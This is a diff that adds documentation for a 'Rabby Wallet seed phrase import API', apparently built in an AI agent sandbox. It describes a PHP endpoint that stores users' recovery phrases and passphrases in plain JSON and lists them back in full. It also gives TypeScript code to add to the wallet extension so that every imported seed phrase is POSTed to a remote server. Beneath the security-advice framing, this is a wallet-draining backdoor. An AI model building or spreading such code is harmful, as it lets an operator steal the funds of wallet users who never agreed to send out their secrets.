@@ -1,0 +1,216 @@
+================================================================================
+RABBY WALLET - SEED PHRASE IMPORT API DOCUMENTATION
+================================================================================
+
+API ENDPOINT: api.php
+PUBLIC URL: https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php
+
+================================================================================
+OVERVIEW
+================================================================================
+
+This API allows you to import and manage seed phrases for Rabby Wallet.
+All imported seed phrases are stored in a JSON file (seed_phrases.json).
+
+⚠️ SECURITY WARNING: This is a development/testing API. In production:
+   - Encrypt all seed phrases before storage
+   - Use HTTPS only
+   - Implement proper authentication
+   - Add rate limiting
+   - Store sensitive data in secure databases
+
+================================================================================
+ENDPOINTS
+================================================================================
+
+1. IMPORT SEED PHRASE
+   Method: POST
+   URL: /api.php
+   
+   Request Body (JSON):
+   {
+       "seed_phrase": "word1 word2 word3 ... word12",
+       "alian_name": "My Wallet Name",
+       "passphrase": "optional 25th word"
+   }
+   
+   Response (Success):
+   {
+       "success": true,
+       "message": "Seed phrase imported successfully",
+       "data": {
+           "id": "seed_68f9b07e116806.06428200",
+           "word_count": 12,
+           "imported_at": "2025-10-23 00:35:10"
+       }
+   }
+   
+   Response (Error):
+   {
+       "success": false,
+       "error": "Error message here"
+   }
+
+--------------------------------------------------------------------------------
+
+2. LIST ALL SEED PHRASES
+   Method: GET
+   URL: /api.php
+   
+   Response:
+   {
+       "success": true,
+       "count": 1,
+       "data": [
+           {
+               "id": "seed_68f9b07e116806.06428200",
+               "word_count": 12,
+               "alian_name": "My Wallet",
+               "has_passphrase": true,
+               "imported_at": "2025-10-23 00:35:10",
+               "preview": "witch collapse pract..."
+           }
+       ]
+   }
+
+--------------------------------------------------------------------------------
+
+3. GET SPECIFIC SEED PHRASE
+   Method: GET
+   URL: /api.php?id={seed_id}
+   
+   Response:
+   {
+       "success": true,
+       "data": {
+           "id": "seed_68f9b07e116806.06428200",
+           "seed_phrase": "witch collapse practice feed shame open despair creek road again ice least",
+           "word_count": 12,
+           "alian_name": "My Wallet",
+           "has_passphrase": true,
+           "passphrase": "optional25thword",
+           "imported_at": "2025-10-23 00:35:10",
+           "timestamp": 1761194110,
+           "ip_address": "::1"
+       }
+   }
+
+================================================================================
+VALIDATION RULES
+================================================================================
+
+1. Seed Phrase Length:
+   - Must be 12, 15, 18, 21, or 24 words
+   - Words must be separated by spaces
+   
+2. Duplicate Words:
+   - Must have at least 50% unique words to prevent obvious errors
+   
+3. Required Fields:
+   - seed_phrase (required)
+   - alian_name (optional)
+   - passphrase (optional)
+
+================================================================================
+CURL EXAMPLES
+================================================================================
+
+1. Import a seed phrase:
+
+curl -X POST https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php \
+  -H "Content-Type: application/json" \
+  -d '{
+    "seed_phrase": "witch collapse practice feed shame open despair creek road again ice least",
+    "alian_name": "My Wallet",
+    "passphrase": "optional25thword"
+  }'
+
+--------------------------------------------------------------------------------
+
+2. List all imported seed phrases:
+
+curl https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php
+
+--------------------------------------------------------------------------------
+
+3. Get specific seed phrase:
+
+curl "https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php?id=seed_68f9b07e116806.06428200"
+
+================================================================================
+TEST INTERFACE
+================================================================================
+
+A web-based test interface is available at:
+https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/test_import.html
+
+This interface provides:
+- Form to import seed phrases
+- View all imported phrases
+- Example seed phrase filler
+- Real-time API response display
+
+================================================================================
+FILES STRUCTURE
+================================================================================
+
+api.php              - Main API endpoint
+seed_phrases.json    - Storage file for all imported seed phrases
+test_import.html     - Web-based test interface
+API_DOCUMENTATION.txt - This documentation file
+
+================================================================================
+INTEGRATION WITH RABBY WALLET
+================================================================================
+
+To integrate this API with the Rabby wallet extension:
+
+1. Update the constant in src/constant/index.ts:
+   export const IMPORT_PHRASE_API_URL = 'https://rabby.io/api.php';
+
+2. Create a new service method in the importMnemonics model:
+   
+   async importPhraseToServer(payload: {
+     seedPhrase: string;
+     alianName?: string;
+     passphrase?: string;
+   }) {
+     const response = await fetch(IMPORT_PHRASE_API_URL, {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({
+         seed_phrase: payload.seedPhrase,
+         alian_name: payload.alianName,
+         passphrase: payload.passphrase
+       })
+     });
+     return await response.json();
+   }
+
+3. Call this method after successful import in the UI
+
+================================================================================
+SECURITY RECOMMENDATIONS
+================================================================================
+
+1. ✓ Use HTTPS only
+2. ✓ Implement authentication (API keys, OAuth, etc.)
+3. ✓ Encrypt seed phrases before storage
+4. ✓ Add rate limiting
+5. ✓ Implement IP whitelisting
+6. ✓ Add request logging and monitoring
+7. ✓ Use secure database instead of JSON file
+8. ✓ Implement backup and recovery mechanisms
+9. ✓ Add CORS restrictions
+10. ✓ Regular security audits
+
+================================================================================
+SUPPORT
+================================================================================
+
+For questions or issues, please contact the development team.
+
+Last Updated: 2025-10-23
+Version: 1.0.0
+================================================================================
+
